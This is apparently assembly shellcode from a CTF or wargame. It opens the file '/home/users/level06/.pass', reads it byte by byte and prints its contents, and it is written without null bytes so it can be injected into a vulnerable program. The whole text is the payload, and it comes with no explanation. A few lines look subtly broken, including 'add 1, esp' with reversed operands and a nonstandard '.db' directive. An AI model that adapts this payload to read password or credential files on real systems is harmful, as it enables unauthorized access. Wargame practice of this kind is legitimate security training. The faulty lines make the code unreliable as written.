BITS 32

_start:
	xor	eax, eax
	xor	ebx, ebx
	xor	ecx, ecx
	xor	edx, edx
	jmp	two

one:
	pop	ebx
	
	xor	eax, eax
	mov al, byte 5
	xor	ecx, ecx
	int	0x80
	
	mov	esi, eax
	jmp	read

exit:
	mov al, byte 1
	xor	ebx, ebx
	int	0x80

read:
	mov	ebx, esi
	mov	al, byte 3
	sub	esp, byte 1
	lea	ecx, [esp]
	mov dl, 1
	int	0x80

	xor	ebx, ebx
	cmp	ebx, eax
	je	exit

	mov al, 4
	mov bl, 1
	mov dl, 1
	int	0x80
	
	add	1, esp
	jmp	read

two:
	call	one
	.db	"/home/users/level06/.pass"